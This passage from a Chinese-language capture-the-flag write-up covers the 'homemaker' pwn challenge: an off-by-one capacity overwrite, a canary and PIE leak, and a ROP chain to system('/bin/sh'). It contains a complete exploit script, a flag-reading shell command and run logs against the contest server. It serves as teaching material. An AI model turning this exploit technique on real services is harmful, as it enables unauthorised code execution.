的堆疊框架（劫持當下）}{7.1 service\_loop 的堆疊框架（劫持當下）}}\label{service_loop-ux7684ux5806ux758aux6846ux67b6ux52abux6301ux7576ux4e0b}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
              高位址
        ┌─────────────────────────────────────────────────────┐
        │ ...（main 的框架）                                  │
 rbp+0x38 ├── (state[0x148]，沒用到)──────────────────────────┤
 rbp+0x30 ├── (state[0x140]，沒用到)──────────────────────────┤
 rbp+0x28 ├── chain[4] = 0（system 的回傳位址）───────────────┤  state[0x138] ← system 入口時 rsp 指這裡
 rbp+0x20 ├── chain[3] = system@plt = PIE+0x10c0              ┤  state[0x130]
 rbp+0x18 ├── chain[2] = "/bin/sh" = PIE+0x4a54               ┤  state[0x128]
 rbp+0x10 ├── chain[1] = pop rdi; ret = PIE+0x12aa            ┤ state[0x120] ← 對齊用 ret 之後 rsp 指這裡
 rbp+0x08 ├── chain[0] = ✶ 回傳位址（對齊用 ret = PIE+0x101a）┤ state[0x118]
 rbp      ├── ✶ saved rbp（保留原值）─────────────────────────┤  state[0x110]
 rbp-0x08 ├── ✶ stack canary（必須原樣寫回）──────────────────┤  state[0x108]
        │   ...（未使用）                                     │  state[0x107..0x000]
 rbp-0x10 ├── capacity（16-bit 0x1ff）────────────────────────┤  state[0x100] ← off-by-one 目標
 rbp-0x110┴── state 基底 ─────────────────────────────────────┘
              低位址
\end{Verbatim}

（\texttt{state\ \allowbreak{}=\ \allowbreak{}rbp-\allowbreak{}0x110}，故 \texttt{state{[}k{]}} 位址 =
\texttt{rbp\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x110\ \allowbreak{}+\ \allowbreak{}k}。）

\begin{quote}
※注意
\textbf{最容易畫錯的就是這裡}：被我們蓋掉的那一格回傳位址（\texttt{state{[}0x118{]}}
= \texttt{rbp+8}） 就是 \textbf{\texttt{chain{[}0{]}}}，而對齊用的
\texttt{ret} \textbf{只會出現一次}（就是 \texttt{chain{[}0{]}}）。
\texttt{state{[}0x120{]}}（\texttt{rbp+0x10}）是\textbf{對齊用
\texttt{ret} 執行完之後} \texttt{rsp} 指到的地方， 也就是
\texttt{chain{[}1{]}} = \texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret} ------
它\textbf{不是}第二個 \texttt{ret}。 這張圖的數字是 gdb 單步走出來的（見
§6.3.1 與 §5.3），不是推的：
\texttt{state{[}0x118{]}=PIE+0x101a}（ret）、\texttt{state{[}0x120{]}=PIE+0x12aa}（pop
rdi）、
\texttt{state{[}0x128{]}=PIE+0x4a54}（``/bin/sh''）、\texttt{state{[}0x130{]}=PIE+0x10c0}（system@plt）、\texttt{state{[}0x138{]}=0}。
\end{quote}

\paragraph{7.2 第一次 APPEND
之後（容量被撐大）}\label{ux7b2cux4e00ux6b21-append-ux4e4bux5f8cux5bb9ux91cfux88abux6490ux5927}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
state[0x000..0x0ff]  ← 我們送的 256 bytes（"A"...）
state[0x100]         ← 0xff  → capacity 由 0x0100 變 0x01ff ✶
state[0x101..0x107]  ← 原本的堆疊垃圾
state[0x108..0x10f]  ← stack canary        ┐
state[0x110..0x117]  ← saved rbp           ├ SEND STATE 一次全部洩漏
state[0x118..0x11f]  ← PIE+0x1a9f（回傳）  ┘
\end{Verbatim}

\paragraph{7.3 第二次 APPEND 的 payload（共 0x200
bytes）}\label{ux7b2cux4e8cux6b21-append-ux7684-payloadux5171-0x200-bytes}

\begin{quote}
※閱讀 這裡的寫法和 \texttt{wp/\allowbreak{}00} §6.3「\textbf{offset
一律從緩衝區起點往上數}」是同一個規矩： \texttt{state{[}0x108{]}}
就是「離 \texttt{state} 起點 0x108 bytes 的那一格」。 差別只有兩點：①
本題的 \texttt{state} 在
\texttt{.\allowbreak{}bss}（不是堆疊上的區域變數），但它同樣是一塊連續記憶體的起點；
② 下面的\textbf{索引是 payload 的索引}，而 \texttt{append} 是從
\texttt{payload+1} 開始複製， 所以 \texttt{payload{[}i{]}} 對應的其實是
\texttt{state{[}i-\allowbreak{}1{]}}（見下方「記法」那一行，別差一格）。
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
payload 索引       內容                        會被複製到 state 的位置
------------------------------------------------------------------------
payload[0]        = 0x02（opcode APPEND）     （不複製，它是 opcode）
payload[1..0x108] = 'B' * 0x108              state[0x000..0x107]
payload[0x109..0x110] = canary（洩漏到的）    state[0x108]  ← 金絲雀槽
payload[0x111..0x118] = saved rbp（原值）     state[0x110]  ← saved rbp
payload[0x119..0x120] = chain[0]             state[0x118]  ← 回傳位址！
payload[0x121..]      = chain[1], chain[2]…  state[0x120..] ← ROP 本體
...
payload[0x1f0..0x1f7] = "/bin/sh\0"          留在 .bss:0x4a54 當 system 的參數
payload[0x1f8..0x1ff] = 補 0                  state[0x1f7..0x1fe]（不重要）
\end{Verbatim}

\begin{quote}
記法：\textbf{\texttt{state{[}i{]}\ \allowbreak{}=\ \allowbreak{}payload{[}i+1{]}}}（append 從
\texttt{payload+1} 開始複製）。這是我自己踩過的坑（見 §11）。
\end{quote}

\begin{quote}
※提示 \textbf{\texttt{chain{[}0{]}} 在
\texttt{state{[}0x118{]}}，\texttt{state{[}0x120{]}} 是「\texttt{ret}
之後 \texttt{rsp} 的位置」} （\texttt{exploit.\allowbreak{}py}
的註解也是這樣寫的：\texttt{chain{[}0{]}} 蓋在被劫持的回傳位址
\texttt{state{[}0x118{]}}， 其餘的鏈從 \texttt{state{[}0x120{]}}
開始）。兩句話講的是不同的格子： * \texttt{state{[}0x118{]}} =
\textbf{被蓋掉的那格回傳位址} = \texttt{chain{[}0{]}}（對齊用
\texttt{ret}） * \texttt{state{[}0x120{]}} = 對齊用 \texttt{ret}
執行完後 \texttt{rsp} 指到的地方 =
\texttt{chain{[}1{]}}（\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret}）

\textbf{\texttt{state{[}0x1ff{]}} 這一格}：append 多讀的那 1 個 byte
就是這個訊框自己的 CRC byte （實測值 \texttt{0xcd}），它來自 payload
\textbf{後面}那一格、不是 payload 裡的任何 byte。 這裡 capacity
已經用不到了，所以填什麼都無所謂 ------ 但別以為那是你能控制的 byte。
\end{quote}

\begin{quote}
※修正 \textbf{\texttt{assert} 是你的安全網}：\texttt{exploit.\allowbreak{}py} 裡有
\texttt{assert\ \allowbreak{}len(payload)\ \allowbreak{}==\ \allowbreak{}0x200}。
訊框長度錯了就讓它早點炸，不要讓程式去猜 ------ 差一個 byte 的 payload
會讓 \texttt{state{[}i{]}\ \allowbreak{}=\ \allowbreak{}payload{[}i+1{]}} 整體位移，結果是 canary
對不上、你卻完全看不出原因。
\end{quote}

\begin{quote}
？ \textbf{為什麼把 \texttt{main} 的金絲雀蓋爛了也不會
\texttt{stack\ \allowbreak{}smashing\ \allowbreak{}detected}？} 因為 \texttt{main}
的收尾程式碼（\texttt{0x1aa4\ \allowbreak{}mov\ \allowbreak{}rdx,{[}rbp-\allowbreak{}8{]}} /
\texttt{0x1aa8\ \allowbreak{}sub\ \allowbreak{}rdx,\allowbreak{}fs:\allowbreak{}0x28}）
\textbf{根本不會被執行到}：我們的鏈是從 \texttt{service\_\allowbreak{}loop} 的
\texttt{ret}（\texttt{0x1a7e}）直接跳走的， \texttt{service\_\allowbreak{}loop} 一旦
\texttt{ret}，控制權就永遠離開 \texttt{main} 了。 \texttt{main}
的框架、\texttt{main} 的金絲雀、\texttt{main}
的回傳位址對我們來說都只是「後面的格子」，不會被檢查也不會被用到。

※注意 但\textbf{\texttt{service\_\allowbreak{}loop}
自己的金絲雀（\texttt{state{[}0x108{]}}）一定要原樣寫回}，
因為它的檢查在我們的鏈\textbf{之前}（\texttt{0x1a76}）。這兩個金絲雀是\textbf{不同的儲存格}，只是值剛好相同
（同一個執行緒的 \texttt{fs:\allowbreak{}0x28}）。
\end{quote}

\paragraph{7.4 訊框在網路上的樣子（第一次
APPEND）}\label{ux8a0aux6846ux5728ux7db2ux8defux4e0aux7684ux6a23ux5b50ux7b2cux4e00ux6b21-append}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1b 5b | 01 01 | 02 cd 41 41 ... 41 | ff | 1b 5c
ESC[     L=0x101  opcode  256 bytes   CRC=0xff  ESC\
\end{Verbatim}

\texttt{0x101} 的最後一個 byte 會被寫到
\texttt{state{[}0x100{]}}，而它必須是 \texttt{0xff} → 所以我們讓 CRC =
0xff。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{8. \texttt{exploit.\allowbreak{}py}
逐行註解}{8. exploit.py 逐行註解}}\label{exploit.py-ux9010ux884cux8a3bux89e3-1}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ sys, time}
\CommentTok{\# from pwn import * 會吃掉多餘的命令列參數（pwnlib.args 的行為），}
\CommentTok{\# 所以 REMOTE 這個參數必須在 import 之前就先讀走}
\NormalTok{WANT\_REMOTE }\OperatorTok{=} \BuiltInTok{len}\NormalTok{(sys.argv) }\OperatorTok{\textgreater{}} \DecValTok{1} \KeywordTok{and}\NormalTok{ sys.argv[}\DecValTok{1}\NormalTok{].upper() }\OperatorTok{==} \StringTok{\textquotesingle{}REMOTE\textquotesingle{}}
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}

\NormalTok{context.arch }\OperatorTok{=} \StringTok{\textquotesingle{}amd64\textquotesingle{}}      \CommentTok{\# 讓 pwntools 用 64{-}bit 規則}
\NormalTok{context.log\_level }\OperatorTok{=} \StringTok{\textquotesingle{}info\textquotesingle{}}
\NormalTok{BIN }\OperatorTok{=} \StringTok{\textquotesingle{}./homemaker\textquotesingle{}}
\NormalTok{HOST, PORT }\OperatorTok{=} \StringTok{\textquotesingle{}chal.sunshinectf.games\textquotesingle{}}\NormalTok{, }\DecValTok{26008}

\NormalTok{MAGIC     }\OperatorTok{=} \BaseNTok{0x1337c35f}       \CommentTok{\# validate() 接受的鑰匙卡魔數}
\NormalTok{OP\_AUTH   }\OperatorTok{=} \DecValTok{1}                \CommentTok{\# 鑰匙卡驗證}
\NormalTok{OP\_APPEND }\OperatorTok{=} \DecValTok{2}                \CommentTok{\# 有漏洞的寫入}
\NormalTok{OP\_LEAK   }\OperatorTok{=} \DecValTok{3}                \CommentTok{\# 洩漏 capacity bytes 的堆疊}
\NormalTok{OP\_EJECT  }\OperatorTok{=} \DecValTok{4}                \CommentTok{\# 離開迴圈 → main 返回 → 觸發 ROP}

\NormalTok{OFF\_RET\_ADDR\_IN\_MAIN }\OperatorTok{=} \BaseNTok{0x1a9f}   \CommentTok{\# 洩漏到的回傳位址（= PIE + 0x1a9f）}
\NormalTok{OFF\_POP\_RDI\_RET      }\OperatorTok{=} \BaseNTok{0x12aa}   \CommentTok{\# pop rdi; ret（藏在 0x1337c35f 立即值裡）}
\NormalTok{OFF\_SYSTEM\_PLT       }\OperatorTok{=} \BaseNTok{0x10c0}   \CommentTok{\# system@plt}
\NormalTok{OFF\_RET              }\OperatorTok{=} \BaseNTok{0x101a}   \CommentTok{\# 單獨一個 ret（.init 的結尾）}
\NormalTok{OFF\_RXBUF            }\OperatorTok{=} \BaseNTok{0x4864}   \CommentTok{\# .bss 接收緩衝區（payload 起點）}

\NormalTok{STATE\_CANARY    }\OperatorTok{=} \BaseNTok{0x108}      \CommentTok{\# 由 gdb 量出來的 state 內偏移}
\NormalTok{STATE\_SAVED\_RBP }\OperatorTok{=} \BaseNTok{0x110}
\NormalTok{STATE\_RETADDR   }\OperatorTok{=} \BaseNTok{0x118}
\NormalTok{SH\_OFF          }\OperatorTok{=} \BaseNTok{0x1f0}      \CommentTok{\# "/bin/sh" 放在 payload 的哪裡}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ crc8(data):                       }\CommentTok{\# 對應 0x11e9 的 8{-}bit CRC}
\NormalTok{    acc }\OperatorTok{=} \DecValTok{0}
    \ControlFlowTok{for}\NormalTok{ b }\KeywordTok{in}\NormalTok{ data:}
\NormalTok{        acc }\OperatorTok{\^{}=}\NormalTok{ b}
        \ControlFlowTok{for}\NormalTok{ \_ }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{8}\NormalTok{):}
\NormalTok{            acc }\OperatorTok{=}\NormalTok{ ((acc }\OperatorTok{\textless{}\textless{}} \DecValTok{1}\NormalTok{) }\OperatorTok{\^{}} \BaseNTok{0x2f}\NormalTok{) }\OperatorTok{\&} \BaseNTok{0xff} \ControlFlowTok{if}\NormalTok{ acc }\OperatorTok{\&} \BaseNTok{0x80} \ControlFlowTok{else}\NormalTok{ (acc }\OperatorTok{\textless{}\textless{}} \DecValTok{1}\NormalTok{) }\OperatorTok{\&} \BaseNTok{0xff}
    \ControlFlowTok{return}\NormalTok{ acc}

\KeywordTok{def}\NormalTok{ frame(payload):                   }\CommentTok{\# 打包訊框（長度是大端序！）}
    \ControlFlowTok{return} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x1b}\StringTok{[\textquotesingle{}} \OperatorTok{+} \BuiltInTok{len}\NormalTok{(payload).to\_bytes(}\DecValTok{2}\NormalTok{, }\StringTok{\textquotesingle{}big\textquotesingle{}}\NormalTok{) }\OperatorTok{+}\NormalTok{ payload }\OperatorTok{+} \OperatorTok{\textbackslash{}}
           \BuiltInTok{bytes}\NormalTok{([crc8(payload)]) }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x1b\textbackslash{}\textbackslash{}}\StringTok{\textquotesingle{}}

\KeywordTok{def}\NormalTok{ recv\_frame(io):                   }\CommentTok{\# 解析伺服器訊框}
\NormalTok{    hdr }\OperatorTok{=}\NormalTok{ io.recvn(}\DecValTok{4}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{5}\NormalTok{)}
    \ControlFlowTok{assert}\NormalTok{ hdr[:}\DecValTok{2}\NormalTok{] }\OperatorTok{==} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x1b}\StringTok{[\textquotesingle{}}
\NormalTok{    ln }\OperatorTok{=}\NormalTok{ u16(hdr[}\DecValTok{2}\NormalTok{:}\DecValTok{4}\NormalTok{], endian}\OperatorTok{=}\StringTok{\textquotesingle{}big\textquotesingle{}}\NormalTok{)  }\CommentTok{\# 伺服器的長度 = status + data}
\NormalTok{    body }\OperatorTok{=}\NormalTok{ io.recvn(ln }\OperatorTok{+} \DecValTok{3}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{5}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ body[}\DecValTok{0}\NormalTok{], body[}\DecValTok{1}\NormalTok{:}\DecValTok{1} \OperatorTok{+}\NormalTok{ ln }\OperatorTok{{-}} \DecValTok{1}\NormalTok{]     }\CommentTok{\# (status, data)}

\KeywordTok{def}\NormalTok{ solve\_crc\_byte(payload, want):    }\CommentTok{\# 讓 CRC 等於想要的 byte（off{-}by{-}one 的關鍵）}
    \ControlFlowTok{for}\NormalTok{ v }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{256}\NormalTok{):}
\NormalTok{        payload[}\DecValTok{1}\NormalTok{] }\OperatorTok{=}\NormalTok{ v}
        \ControlFlowTok{if}\NormalTok{ crc8(}\BuiltInTok{bytes}\NormalTok{(payload)) }\OperatorTok{==}\NormalTok{ want:}
            \ControlFlowTok{return}\NormalTok{ v}
    \ControlFlowTok{raise} \PreprocessorTok{RuntimeError}\NormalTok{(}\StringTok{\textquotesingle{}no crc solution\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

主流程：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# 0) 吃掉橫幅（尾端有兩個 \textquotesingle{}\textbackslash{}n\textquotesingle{}）}
\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}\textless{}\textless{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)}\OperatorTok{;}\NormalTok{ io.recvn(}\DecValTok{1}\NormalTok{)}

\CommentTok{\# 1) AUTH：opcode 1 + magic（大端序）→ capacity = 0x100}
\NormalTok{io.send(frame(}\BuiltInTok{bytes}\NormalTok{([OP\_AUTH]) }\OperatorTok{+}\NormalTok{ p32(MAGIC, endian}\OperatorTok{=}\StringTok{\textquotesingle{}big\textquotesingle{}}\NormalTok{)))}
\NormalTok{st, \_ }\OperatorTok{=}\NormalTok{ recv\_frame(io)}\OperatorTok{;} \ControlFlowTok{assert}\NormalTok{ st }\OperatorTok{==} \DecValTok{0}

\CommentTok{\# 2) APPEND\#1：L = 0x101 → n = 0x100 = capacity 通過檢查，但寫了 0x101 bytes，}
\CommentTok{\#    最後一個 byte（= 訊框 CRC）落在 state[0x100] → capacity = 0x01ff}
\NormalTok{pl }\OperatorTok{=} \BuiltInTok{bytearray}\NormalTok{(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x02}\StringTok{\textquotesingle{}} \OperatorTok{+} \StringTok{b\textquotesingle{}A\textquotesingle{}} \OperatorTok{*} \BaseNTok{0x100}\NormalTok{)}
\NormalTok{pl[}\DecValTok{1}\NormalTok{] }\OperatorTok{=}\NormalTok{ solve\_crc\_byte(pl, }\BaseNTok{0xff}\NormalTok{)}
\NormalTok{io.send(frame(}\BuiltInTok{bytes}\NormalTok{(pl)))}
\NormalTok{st, \_ }\OperatorTok{=}\NormalTok{ recv\_frame(io)}\OperatorTok{;} \ControlFlowTok{assert}\NormalTok{ st }\OperatorTok{==} \DecValTok{0}

\CommentTok{\# 3) SEND STATE：洩漏 0x1ff bytes 堆疊}
\NormalTok{io.send(frame(}\BuiltInTok{bytes}\NormalTok{([OP\_LEAK])))}
\NormalTok{st, leak }\OperatorTok{=}\NormalTok{ recv\_frame(io)}
\NormalTok{canary    }\OperatorTok{=}\NormalTok{ u64(leak[}\BaseNTok{0x108}\NormalTok{:}\BaseNTok{0x110}\NormalTok{])     }\CommentTok{\# 金絲雀}
\NormalTok{saved\_rbp }\OperatorTok{=}\NormalTok{ u64(leak[}\BaseNTok{0x110}\NormalTok{:}\BaseNTok{0x118}\NormalTok{])     }\CommentTok{\# saved rbp（用來判斷對齊）}
\NormalTok{ret\_main  }\OperatorTok{=}\NormalTok{ u64(leak[}\BaseNTok{0x118}\NormalTok{:}\BaseNTok{0x120}\NormalTok{])     }\CommentTok{\# PIE + 0x1a9f}
\NormalTok{pie       }\OperatorTok{=}\NormalTok{ ret\_main }\OperatorTok{{-}} \BaseNTok{0x1a9f}
\ControlFlowTok{assert}\NormalTok{ pie }\OperatorTok{\&} \BaseNTok{0xfff} \OperatorTok{==} \DecValTok{0}                \CommentTok{\# 健全性檢查：一定 page 對齊}
\ControlFlowTok{assert}\NormalTok{ canary }\OperatorTok{\&} \BaseNTok{0xff} \OperatorTok{==} \DecValTok{0}              \CommentTok{\# 健全性檢查：金絲雀低位必為 0}

\CommentTok{\# 4) 組 ROP chain}
\NormalTok{pop\_rdi }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x12aa}
\NormalTok{system  }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x10c0}
\NormalTok{binsh   }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x4864} \OperatorTok{+} \BaseNTok{0x1f0}         \CommentTok{\# 我們的 "/bin/sh"（在 .bss）}
\NormalTok{ret     }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x101a}
\NormalTok{chain   }\OperatorTok{=}\NormalTok{ [pop\_rdi, binsh, system, }\DecValTok{0}\NormalTok{]}
\ControlFlowTok{if}\NormalTok{ (saved\_rbp }\OperatorTok{+} \BaseNTok{0x10}\NormalTok{) }\OperatorTok{\%} \DecValTok{16} \OperatorTok{==} \DecValTok{0}\NormalTok{:       }\CommentTok{\# system 入口需要 rsp\%16 == 8}
\NormalTok{    chain }\OperatorTok{=}\NormalTok{ [ret] }\OperatorTok{+}\NormalTok{ chain}

\CommentTok{\# 5) APPEND\#2：L = 0x200 → 寫 0x200 bytes，蓋掉 canary/rbp/ret 並鋪好 ROP}
\NormalTok{payload  }\OperatorTok{=} \BuiltInTok{bytearray}\NormalTok{(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x02}\StringTok{\textquotesingle{}} \OperatorTok{+} \StringTok{b\textquotesingle{}B\textquotesingle{}} \OperatorTok{*} \BaseNTok{0x108}\NormalTok{)   }\CommentTok{\# state[0..0x107]}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(canary)                          }\CommentTok{\# state[0x108]}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(saved\_rbp)                       }\CommentTok{\# state[0x110]}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(chain[}\DecValTok{0}\NormalTok{])                        }\CommentTok{\# state[0x118] ← 回傳位址（= chain[0]）}
\ControlFlowTok{for}\NormalTok{ i, w }\KeywordTok{in} \BuiltInTok{enumerate}\NormalTok{(chain[}\DecValTok{1}\NormalTok{:]):               }\CommentTok{\# state[0x120] ← 鏈本體（chain[1] 開始）}
\NormalTok{    payload }\OperatorTok{+=}\NormalTok{ p64(w)}
\NormalTok{payload }\OperatorTok{+=} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}} \OperatorTok{*}\NormalTok{ (}\BaseNTok{0x1f0} \OperatorTok{{-}} \BuiltInTok{len}\NormalTok{(payload))}
\NormalTok{payload }\OperatorTok{+=} \StringTok{b\textquotesingle{}/bin/sh}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}}                       \CommentTok{\# .bss:0x4a54}
\NormalTok{payload }\OperatorTok{+=} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}} \OperatorTok{*}\NormalTok{ (}\BaseNTok{0x200} \OperatorTok{{-}} \BuiltInTok{len}\NormalTok{(payload))     }\CommentTok{\# 補滿 0x200}
\ControlFlowTok{assert} \BuiltInTok{len}\NormalTok{(payload) }\OperatorTok{==} \BaseNTok{0x200}\NormalTok{, }\BuiltInTok{len}\NormalTok{(payload)      }\CommentTok{\# 安全網：長度錯了就早點炸}
\NormalTok{io.send(frame(}\BuiltInTok{bytes}\NormalTok{(payload)))}
\NormalTok{st, \_ }\OperatorTok{=}\NormalTok{ recv\_frame(io)}\OperatorTok{;} \ControlFlowTok{assert}\NormalTok{ st }\OperatorTok{==} \DecValTok{0}

\CommentTok{\# 6) EJECT：離開迴圈 → 0x1865 的 leave;ret（金絲雀檢查通過）→ ROP → system("/bin/sh")}
\NormalTok{io.send(frame(}\BuiltInTok{bytes}\NormalTok{([OP\_EJECT])))}
\NormalTok{recv\_frame(io)                                  }\CommentTok{\# EJECT 的 ack，接著就是 shell}

\CommentTok{\# 7) 下指令、收 flag}
\NormalTok{io.send(}\StringTok{b\textquotesingle{}cat flag.txt /flag /home/*/flag.txt 2\textgreater{}/dev/null; ls {-}la; id; echo DONE}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)}
\NormalTok{out }\OperatorTok{=}\NormalTok{ io.recvrepeat(}\DecValTok{6}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\texttt{main()} 只負責：選 local / remote、呼叫
\texttt{exploit()}、從輸出裡用 \texttt{sun\{\allowbreak{}...\allowbreak{}\}\allowbreak{}} 抓出 flag 並印
\texttt{FLAG:\allowbreak{}\ \allowbreak{}...}。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{9.
實際執行結果}\label{ux5be6ux969bux57f7ux884cux7d50ux679c-4}

\begin{quote}
※注意 \textbf{一定要 \texttt{cd\ \allowbreak{}pwn5/} 之後再跑}，因為
\texttt{exploit.\allowbreak{}py} 用的是相對路徑 \texttt{./\allowbreak{}homemaker} （在 repo
根目錄執行會得到
\texttt{{[}ERROR{]}\ \allowbreak{}\textquotesingle{}\allowbreak{}./\allowbreak{}homemaker\textquotesingle{}\allowbreak{}\ \allowbreak{}does\ \allowbreak{}not\ \allowbreak{}exist}）。
或直接用 \texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh\ \allowbreak{}pwn5}（它會自動 cd
進題目目錄、並且附上正確的 port）。
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ pwn5}
\ExtensionTok{python3}\NormalTok{ exploit.py              }\CommentTok{\# 本地}
\ExtensionTok{python3}\NormalTok{ exploit.py REMOTE       }\CommentTok{\# 遠端 chal.sunshinectf.games:26008}
\end{Highlighting}
\end{Shaded}

（想開 pwntools 的除錯模式是 \texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}DEBUG} ------
掛在\textbf{命令列參數}上，不是 \texttt{DEBUG=1} 環境變數。）

\paragraph{9.1 本機（先用假 flag
驗證）}\label{ux672cux6a5fux5148ux7528ux5047-flag-ux9a57ux8b49}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{$}\NormalTok{ echo }\StringTok{\textquotesingle{}sun\{LOCAL\_DUMMY\_FLAG\}\textquotesingle{}} \OperatorTok{\textgreater{}}\NormalTok{ flag.txt}
\ExtensionTok{$}\NormalTok{ python3 exploit.py}
\ExtensionTok{[+]}\NormalTok{ canary    = 0x8ad694b86951ed00}
\ExtensionTok{[+]}\NormalTok{ saved rbp = 0x7ffc52bc2560}
\ExtensionTok{[+]}\NormalTok{ PIE base  = 0x55c8ae3eb000}
\ExtensionTok{[+]}\NormalTok{ shell should be up, sending commands}
\ExtensionTok{sun\{LOCAL\_DUMMY\_FLAG\}}
\ExtensionTok{total}\NormalTok{ 116}
\ExtensionTok{drwxr{-}xr{-}x}\NormalTok{  3 kzzz kzzz   4096 Sep 28 00:25 .}
\ExtensionTok{...}
\VariableTok{uid}\OperatorTok{=}\NormalTok{1001}\KeywordTok{(}\ExtensionTok{kzzz}\KeywordTok{)} \VariableTok{gid}\OperatorTok{=}\NormalTok{1001}\KeywordTok{(}\ExtensionTok{kzzz}\KeywordTok{)} \VariableTok{groups}\OperatorTok{=}\NormalTok{1001}\KeywordTok{(}\ExtensionTok{kzzz}\KeywordTok{)}\ExtensionTok{,65534}\ErrorTok{(}\ExtensionTok{nobody}\KeywordTok{)}
\ExtensionTok{DONE}

\ExtensionTok{FLAG:}\NormalTok{ sun\{LOCAL\_DUMMY\_FLAG\}}
\end{Highlighting}
\end{Shaded}

\paragraph{9.2 遠端（真實 flag）}\label{ux9060ux7aefux771fux5be6-flag-1}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{$}\NormalTok{ python3 exploit.py REMOTE}
\ExtensionTok{[x]}\NormalTok{ Opening connection to chal.sunshinectf.games on port 26008}
\ExtensionTok{[+]}\NormalTok{ Opening connection to chal.sunshinectf.games on port 26008: Done}
\ExtensionTok{[+]}\NormalTok{ canary    = 0xc6890e4ecbb41300}
\ExtensionTok{[+]}\NormalTok{ saved rbp = 0x7fffa9c3def0}
\ExtensionTok{[+]}\NormalTok{ PIE base  = 0x5ef6f44bf000}
\ExtensionTok{[+]}\NormalTok{ shell should be up, sending commands}
\ExtensionTok{sun\{the\_future\_is\_now\_today\_well\_wait\_how\_are\_you\_reading\_this\}}
\ExtensionTok{total}\NormalTok{ 12}
\ExtensionTok{drwxr{-}xr{-}x}\NormalTok{ 2 root root      4096 Sep 26 00:54 .}
\ExtensionTok{drwxr{-}xr{-}x}\NormalTok{ 1 root root      4096 Sep 26 00:55 ..}
\ExtensionTok{{-}rw{-}r{-}{-}{-}{-}{-}}\NormalTok{ 1 root homemaker   64 Sep 26 00:54 flag.txt}
\VariableTok{uid}\OperatorTok{=}\NormalTok{1337}\KeywordTok{(}\ExtensionTok{homemaker}\KeywordTok{)} \VariableTok{gid}\OperatorTok{=}\NormalTok{1337}\KeywordTok{(}\ExtensionTok{homemaker}\KeywordTok{)} \VariableTok{groups}\OperatorTok{=}\NormalTok{1337}\KeywordTok{(}\ExtensionTok{homemaker}\KeywordTok{)}
\ExtensionTok{DONE}

\ExtensionTok{FLAG:}\NormalTok{ sun\{the\_future\_is\_now\_today\_well\_wait\_how\_are\_you\_reading\_this\}}
\end{Highlighting}
\end{Shaded}

\textbf{真實
flag：\texttt{sun\{\allowbreak{}the\_\allowbreak{}future\_\allowbreak{}is\_\allowbreak{}now\_\allowbreak{}today\_\allowbreak{}well\_\allowbreak{}wait\_\allowbreak{}how\_\allowbreak{}are\_\allowbreak{}you\_\allowbreak{}reading\_\allowbreak{}this\}\allowbreak{}}}
（遠端 flag 就在工作目錄的 \texttt{flag.\allowbreak{}txt}，權限
\texttt{-\allowbreak{}rw-\allowbreak{}r-\allowbreak{}\/\allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}\ \allowbreak{}homemaker:\allowbreak{}homemaker}，而 shell 的身分就是
\texttt{homemaker}。）

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{10.
完整攻擊流程圖}\label{ux5b8cux6574ux653bux64caux6d41ux7a0bux5716}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
(1) AUTH   ─ opcode1 + "13 37 c3 5f"
                 │  capacity = 0x100
                 ▼
